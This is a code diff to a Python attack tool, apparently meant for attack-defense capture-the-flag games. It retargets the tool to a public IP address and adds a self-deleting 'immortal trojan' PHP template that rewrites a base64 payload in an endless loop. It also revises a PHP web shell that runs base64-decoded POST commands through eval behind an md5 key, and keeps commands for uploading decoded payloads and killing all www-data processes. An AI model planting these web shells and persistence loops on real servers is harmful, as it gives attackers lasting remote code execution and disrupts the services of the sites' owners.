@@ -16,8 +16,9 @@ class BckDoorConfig:
         self.method=method
         self.resultEndPos=resultEndPos
         self.resultStartPos=resultStartPos
+
 token='serfendTeam'
-ips=['192.168.43.38:10000','192.168.43.38:10001']#'192.168.43.229:8081','192.168.43.229:8081',]
+ips=['47.74.238.240:8802','47.74.238.240:8801']
 webrootPath=''
 rawbackdoor_list=[
     BckDoorConfig('copyright={0}','index.php',method='get',resultStartPos='/h5>',resultEndPos='<h5>hello')
@@ -27,15 +28,27 @@ rawbackdoor_list=[
 #     BckDoorConfig('page=md5&res="or eval($_POST[a]) or"&a={0};','action.php'),
 #     BckDoorConfig('666={0};','1.php'),
 
+immortalTroj_tpl="""<?php
+unlink(__FILE__);
+ignore_user_abort(true);
+set_time_limit(0);
+while (1){{
+	file_put_contents('{1}',base64_decode('{0}'));
+	usleep(1000);
+    }}
+    ?>
+    
+"""
 
-backdoor_tpl="""
-<?php
-    if ($_GET['{1}']===md5('{0}')){{
+backdoor_tpl="""<?php
+    echo 'your id:' . md5($_GET['{0}']) . '-to-{1}';
+    if (md5($_GET['{0}'])==='{1}'){{
     $tmp=base64_decode($_POST['cmd']);
-    @eval($tmp);}}
-?>"""
+    @eval($tmp);}}?>
+    
+    """
 uploader="/bin/echo '{0}' | /usr/bin/base64 -d > {1}"
-killer="ps -A|grep apache2|awk '{print $1}'|args kill -9"
+killer="killall -uwww-data"
 backdoor_des=[]
 backdoor_url=[]
 backdoor_key=[]
